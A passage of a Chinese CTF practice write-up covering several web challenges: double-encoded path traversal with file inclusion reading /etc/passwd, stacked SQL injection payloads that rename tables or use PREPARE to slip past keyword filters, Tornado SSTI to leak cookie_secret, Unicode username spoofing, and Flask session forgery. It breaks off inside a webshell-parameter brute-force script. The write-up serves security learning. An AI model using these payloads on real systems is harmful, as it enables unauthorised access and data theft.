urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到以上源代码，这一块其实是<code>PHPMyAdmin</code>以前爆出来过的任意文件读取漏洞的一部分稍微修改而来</p><p>这里可以找到<a href="https://cloud.tencent.com/developer/article/1512101" target="_blank" rel="noopener">PHPMyAdmin4.8.1任意文件读取漏洞复现</a>这篇文章中学习一下原理</p><p>这里要求被包含的<code>file</code>需要在<code>$whitelist</code>里面</p><p>这里问题主要出在第26行代码<code>$_page = urldecode($page);</code>当中</p><p>我们这里可以将<code>?</code>进行两次<code>URL编码</code></p><p>比如我们这里传入</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">source</span>.php?<span class="keyword">file</span>=<span class="keyword">source</span>.php%<span class="number">253</span>f<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure><p>在经过<code>urldecode</code>之后，传到后端就是</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">source</span>.php?<span class="keyword">file</span>=<span class="keyword">source</span>.php?<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure><p>在下面</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">  $_page,</span><br><span class="line">  <span class="number">0</span>,</span><br><span class="line">  mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>代码的作用下，他会在截取第一个问号前的部分路径，由于我们这里进行了<code>二次URL编码</code>，所以会使得<code>$_page</code>为<code>source.php</code>，从而在白名单内符合条件从而返回true</p><p>再往下文件包含部分，由于这里包含的文件为</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">source.php?/<span class="built_in">..</span>/<span class="built_in">..</span>/<span class="built_in">..</span>/<span class="built_in">..</span>/<span class="built_in">..</span>/<span class="built_in">..</span>/etc/passwd</span><br></pre></td></tr></table></figure><p>把source.php?作为文件名然后路径穿越到<code>/etc/passwd</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200207203244.png" alt=""></p><p>这里看<code>hint.php</code>可知<code>flag</code>在<code>ffffllllaaaagggg</code>中</p><p>直接包含得到<code>flag</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200207205347.png" alt=""></p><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200207210015.png" alt=""></p><p>测试了一番，发现是堆叠注入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>,$inject);</span><br></pre></td></tr></table></figure><p>过滤了以上几个函数</p><p>那么先查一下库名、表名之类的</p><p>得到库`ctftraining、information_schema、mysql、</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200207210308.png" alt=""></p><p>查一下表</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200207210912.png" alt=""></p><p>查一下<code>words</code>表</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200208202157.png" alt=""></p><p>可以看到存在<code>id</code>和<code>data</code>字段，这里可知原始输入查询应该是从<code>words</code>表里查询的</p><p>然后查一下<code>1919810931114514</code>表的字段可以看到我们需要的<code>flag</code>在里面</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200207212014.png" alt=""></p><p>但由于这里限制了<code>select</code>的使用，直接查询<code>flag</code>不太可行</p><p>这里有两个思路：</p><h2 id="修改表名列名"><a href="#修改表名列名" class="headerlink" title="修改表名列名"></a>修改表名列名</h2><p>由于这里的原始查询是从<code>word</code>表中查询，那么这里可以这么想</p><p>如果我们把<code>1919810931114514</code>改名为<code>words</code></p><p>然后给新的<code>words</code>表增加一个新的<code>id</code>字段，以及把<code>flag</code>字段修改为<code>data</code>，那么可以直接原始查询得到数据</p><p>得到我们需要的<code>flag</code></p><p>这里用到了<code>alert</code>和<code>rename</code>两个方法</p><p>具体两个方法的用法如下:</p><p><a href="https://www.runoob.com/mysql/mysql-alter.html" target="_blank" rel="noopener">Mysql-alert</a>用于删除、增加修改字段名</p><p><a href="https://blog.csdn.net/u013063153/article/details/53304329" target="_blank" rel="noopener">Mysql-rename</a>用于修改表名</p><p>这里先修改原<code>words</code>表名为<code>wordss</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RENAME TABLE &#96;words&#96; TO &#96;wordss&#96;</span><br></pre></td></tr></table></figure><p>然后修改<code>1919810931114514</code>表名为<code>words</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;</span><br></pre></td></tr></table></figure><p>然后修改<code>flag</code>字段为<code>id</code>字段即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200208203322.png" alt=""></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL</span><br></pre></td></tr></table></figure><p>这里修改<code>flag</code>名为<code>id</code>并且修改类型为<code>VARCHAR</code>，字符集修改为<code>UTF-8</code>,使用<code>utf8_general_ci</code>作为排序规则，最后设置默认值非<code>NULL</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;inject&#x3D;1&#39; or 1&#x3D;1 -- -</span><br></pre></td></tr></table></figure><p>获得<code>flag</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200208204451.png" alt=""></p><h2 id="预编译查询"><a href="#预编译查询" class="headerlink" title="预编译查询"></a>预编译查询</h2><p>在<code>Mysql</code>中，使用@做前缀的变量为用户自定义变量，如<code>@a</code></p><p>使用@@做前缀则为<code>global</code>或<code>session</code>变量</p><p>然后提一下<code>Mysql</code>的预编译指令<code>PREPARE</code></p><p><a href="https://www.cnblogs.com/geaozhang/p/9891338.html" target="_blank" rel="noopener">Mysql-PREPARE</a></p><p>语法如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 定义预处理语句</span><br><span class="line">PREPARE stmt_name FROM preparable_stmt;</span><br><span class="line"># 执行预处理语句</span><br><span class="line">EXECUTE stmt_name [USING @var_name [, @var_name] ...];</span><br><span class="line"># 删除(释放)定义</span><br><span class="line">&#123;DEALLOCATE | DROP&#125; PREPARE stmt_name;</span><br></pre></td></tr></table></figure><p>这里我们定义一个用户变量<code>@x</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SET @x&#x3D;concat(&quot;sele&quot;,&quot;ct flag from &#96;1919810931114514&#96;&quot;)</span><br></pre></td></tr></table></figure><p>由于<code>SELECT</code>被过滤，这里使用<code>concat</code>函数进行连接</p><p>这里也可以使用十六进制来绕过</p><p>然后准备一个变量<code>a</code>用来定义预处理语句</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PREPARE a FROM @x</span><br></pre></td></tr></table></figure><p>最后执行我们定义的语句<code>a</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXECUTE a</span><br></pre></td></tr></table></figure><p>最后总的<code>payload</code>如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;inject&#x3D;1&#39;;SET @x&#x3D;concat(&quot;sele&quot;,&quot;ct flag from &#96;1919810931114514&#96;&quot;);PREPARE a FROM @x;EXECUTE a; -- -</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200208210736.png" alt=""></p><p>这里要注意的几点是：</p><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">在Mysql中变量名使用双引号<span class="string">"进行包裹</span></span><br><span class="line">而针对数字表名、列名等等，得使用反引号`进行包裹</span><br><span class="line">在常规select等函数被屏蔽的情况下，可以试试堆叠注入等方法</span><br></pre></td></tr></table></figure><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>打开可以看到有三个文件</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200208213718.png" alt=""></p><p>分别进去查看</p><p><code>flag.txt</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200208213806.png" alt=""></p><p><code>welcome.txt</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200208213823.png" alt=""></p><p><code>hints.txt</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200208213920.png" alt=""></p><p>可以得到三个结论：</p><ul><li><code>flag</code>在<code>/fllllllllllllag</code>文件中</li><li><code>Render</code>为tornado模板渲染函数，这里应该存在SSTI</li><li><code>filehash</code>为<code>md5(cookie_secret+md5(filename))</code></li></ul><p>这里需要得到<code>cookie_secret</code></p><p>这里看<a href="https://tornado.readthedocs.io/en/latest/web.html#tornado.web.Application.settings" target="_blank" rel="noopener">官方文档</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211184931.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211184642.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211185335.png" alt=""></p><p>这里由于<code>RequestHandler.settings</code>是<code>RequestHandler.application.settings</code>的别名</p><p>那么可以通过<code>handler.settings[&#39;cookie_secret&#39;]</code>来直接访问到我们需要的<code>cookie_secret</code></p><p>在<code>welcome.txt</code>文件中让其报错，可以看到明显存在<code>SSTI</code>，直接拿到<code>cookie_secret</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211190108.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211185844.png" alt=""></p><p>这样的话得到了文件名和<code>cookie_secret</code>,就可以直接按照<code>md5(cookie_secret+md5(filename))</code>来合成<code>filehash</code></p><p>直接用<code>HackBar</code>自带的<code>MD5</code>合成了哈希，然后提交得到<code>flag</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211190351.png" alt=""></p><p><strong>事实证明拿到不熟悉的框架直接看官方文档是最方便直接的</strong></p><h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211190930.png" alt=""></p><p>查了半天，发现好像把<code>union、updatexml、extractvalue、sleep、or、and、if、flag</code>等给过滤了</p><p>这里试试堆叠注入</p><p>查到了数据库</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211191212.png" alt=""></p><p>查到了表名</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211192208.png" alt=""></p><p>做到这我才发现这道题以前<code>SUCTF 2019</code>的时候做过，但当时没做出来，还记得当时有个非预期解来着</p><p>这里找到了题目源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">        $BlackList = <span class="string">"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""</span>;</span><br><span class="line">        <span class="comment">//var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query']));</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&#123;$BlackList&#125;/is"</span>,$post[<span class="string">'query'</span>]))&#123;</span><br><span class="line">            <span class="comment">//echo $post['query'];</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Nonono."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen($post[<span class="string">'query'</span>])&gt;<span class="number">40</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Too long."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="string">"select "</span>.$post[<span class="string">'query'</span>].<span class="string">"||flag from Flag"</span>;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>($res = mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                <span class="keyword">while</span>($row = mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">while</span>(@mysqli_next_result($MysqlLink));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到查询语句为：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">".$post['query']."</span>||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure><p>这里提供预期解和非预期的解法和思路：</p><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>放入查询语句为：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span>||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure><p>这里解释一下<code>sql_mode</code>的作用</p><p><a href="https://segmentfault.com/a/1190000005936172" target="_blank" rel="noopener">https://segmentfault.com/a/1190000005936172</a></p><p><a href="https://dev.mysql.com/doc/refman/5.6/en/sql-mode.html" target="_blank" rel="noopener">官方Sql_mode文档</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211203007.png" alt=""></p><p>这里详细说一下上个查询语句的执行流程：</p><p>首先</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211203628.png" alt=""></p><p>是正常的闭合前面查询结果来进行堆叠注入</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT</span><br></pre></td></tr></table></figure><p>设置<code>sql_mode</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211203728.png" alt=""></p><p>这条语句其实可以等价于</p><p>可以看到他把<code>select 1</code>和<code>select flag from flag</code>的结果拼接在一起</p><p>效果类似于<code>concat</code>函数</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211205132.png" alt=""></p><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">*,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>插入查询语句就是:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> *,<span class="number">1</span>||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211204429.png" alt=""></p><p>这里的<code>||</code>为货真价实的或操作</p><p>这里先查询了<code>*</code>，即<code>Flag</code>表d额所有内容，所以查询到了<code>flag</code></p><p>后面的<code>1||flag</code>由于在查询<code>1</code>时就查询到了结果<code>1</code>，所以<code>1||flag</code>的查询结果就为<code>1</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211205204.png" alt=""></p><p>可以看到和我们本地查询的结果是是一致的</p><p><strong>这道题的难点，我感觉最主要在于对后端查询那一块的黑盒，毕竟<code>select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag</code>的骚操作对于平时中规中矩的<code>SQL注入</code>来说还是有点难想到，这道题如果把<code>*</code>给过滤的话，那么预期解我感觉没几个人能做出来~</strong></p><h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><p>先注册一个账号进去看看</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212124240.png" alt=""></p><p>一个一个进去看源代码</p><p>在<code>post</code>界面的网页注释中看到了这么一条注释</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212124333.png" alt=""></p><p>在<code>index</code>界面的注释中看到这么一条注释</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212124418.png" alt=""></p><p>这样看来要求我们要想办法以<code>admin</code>的身份进入才能获得<code>flag</code></p><h2 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h2><p>先看看<code>Github</code>的代码</p><p>在<code>routes.py</code>中</p><p>看到修改密码处的代码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/login', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">'name'</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">'Invalid username or password'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, title = <span class="string">'login'</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/change', methods = ['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        name = strlower(session[<span class="string">'name'</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">'change successful'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'change.html'</span>, title = <span class="string">'change'</span>, form = form)</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strlower</span><span class="params">(username)</span>:</span></span><br><span class="line">  username = nodeprep.prepare(username)</span><br><span class="line">  <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure><p>这里对用户名进行了<code>strlower</code>函数操作，而这个函数调用了<code>nodeprep.prepare</code>方法</p><p>这个方法大致意思是：</p><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">ᴀ-&gt;A-&gt;a</span><br></pre></td></tr></table></figure><p>参考这个连接<a href="https://unicode-table.com/en/search/?q=small+capital" target="_blank" rel="noopener">https://unicode-table.com/en/search/?q=small+capital</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212133533.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212133512.png" alt=""></p><p>这里装不上指定版本的<code>Twisted</code>，不过大致意思就是上面那个转化规则</p><p>那我们就可以注册<code>ᴬᴰᴹᴵᴺ</code>的用户，在登录的时候变成<code>ADMIN，然后在修改密码后变成</code>admin`</p><p>先注册</p><p>![image-20200212134412008](/Users/a2u13/Library/Application Support/typora-user-images/image-20200212134412008.png)</p><p>然后以<code>ᴬᴰᴹᴵᴺ</code>为用户名登录</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212134536.png" alt=""></p><p>然后修改密码重新登录即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212134700.png" alt=""></p><h2 id="Session伪造"><a href="#Session伪造" class="headerlink" title="Session伪造"></a>Session伪造</h2><p>![image-20200212140419886](/Users/a2u13/Library/Application Support/typora-user-images/image-20200212140419886.png)</p><p>这里可以看到要求<code>session[&#39;name&#39;]</code>为<code>admin</code>即可得到<code>flag</code></p><p>那么可以考虑<code>Flask session</code>哭护短本地不加密储存带来的问题</p><p>Session安全这一块可以看P牛的这篇文章</p><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p><p>这里附上P牛的Session解密脚本，这里稍微修改了一下下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">payload, sig = payload.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)</span><br><span class="line">payload, timestamp = payload.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">decompress = <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> payload.startswith(<span class="string">'.'</span>):</span><br><span class="line">payload = payload[<span class="number">1</span>:]</span><br><span class="line">decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">payload = base64_decode(payload)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line"> <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> decompress:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">payload = zlib.decompress(payload)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line"> <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">session = input()</span><br><span class="line">print(decryption(session))</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212140050.png" alt=""></p><p>可以看到被成功解密了</p><p>这里是<code>Flask-Session</code>伪造的脚本</p><p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a></p><p>![image-20200212140331979](/Users/a2u13/Library/Application Support/typora-user-images/image-20200212140331979.png)</p><p><code>secret_key</code>可以在<code>config.py</code>文件中得到，这里可以为<code>ckj123</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212140545.png" alt=""></p><p>这样的话就可以伪造<code>admin</code>的<code>session</code>了</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s "ckj123" -t "&#123;'_fresh': True, '_id': b'4536492d08b0b870cd7da4aec248ec6ca38bef8dcc8884633d7ea71caf5293c44d487d96a67a4f78f258f93b56ad4f00e49b8069d699415c53e361b0d46f798e', 'csrf_token': b'f0777b91d1a3fadae468840df397f11b26e6ccf2', 'image': b'AYa4', 'name': 'admin', 'user_id': '10'&#125;"</span><br></pre></td></tr></table></figure><p>这里修改之前解密的<code>session</code>的<code>name</code>为<code>admin</code>即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212140920.png" alt=""></p><p>然后在浏览器修改<code>cookies</code>的值即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212141152.png" alt=""></p><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212141317.png" alt=""></p><p>这里由于未对<code>session</code>的<code>check</code>,那么可以多线程同时条件竞争来修改<code>admin</code>的密码</p><p>大致思路是：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">当一个用户刚好处于修改密码的那一块时候</span><br><span class="line">另一个用户退出，然后以 <span class="keyword">admin</span>为用户名和前一个用户要求改的密码为新密码登录</span><br><span class="line">此时由于前面change处的<span class="keyword">session</span>[<span class="string">'name'</span>]被修改为<span class="keyword">login</span>处的<span class="keyword">session</span>[<span class="string">'name'</span>]</span><br><span class="line">导致 <span class="keyword">admin</span> 的密码被修改</span><br></pre></td></tr></table></figure><p>但这方案好像不太可行，这里仅提供一个思路</p><h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211224454.png" alt=""></p><p>脱下来瞅瞅代码</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211225230.png" alt=""></p><p>Emmmmmm，有点点多</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200211225358.png" alt=""></p><p>而且代码都是被混淆过的，直接<code>php-hook</code>很麻烦，也没必要</p><p>但这里分析它的代码，可以看到它里面包含了许多的<code>$_POST、$_GET</code>请求，那么是不是可以认为其中包含一句话木马，需要我们找到呢？</p><p>反正大概思路就是一个个爆破<code>$_POST、$_GET</code>的参数，直到找到能够执行命令的那个参数的后门和参数为止</p><p>这里提供<code>$_POST、$_GET</code>的两个正则</p><p><strong>$_GET</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re.compile(<span class="string">"\$_GET\[[\'\"](.*?)[\"\']\]"</span>)</span><br></pre></td></tr></table></figure><p><strong>$_POST</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">re.compile(<span class="string">"\$_POST\[[\'\"](.*?)[\'\"]\]"</span>)</span><br></pre></td></tr></table></figure><p>这里我写了个<code>pyhton</code>脚本</p><p><strong>猛男多线程版本:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">get_preg = re.compile(<span class="string">"\$_GET\[[\'\"](.*?)[\"\']\]"</span>)</span><br><span class="line">post_preg = re.compile(<span 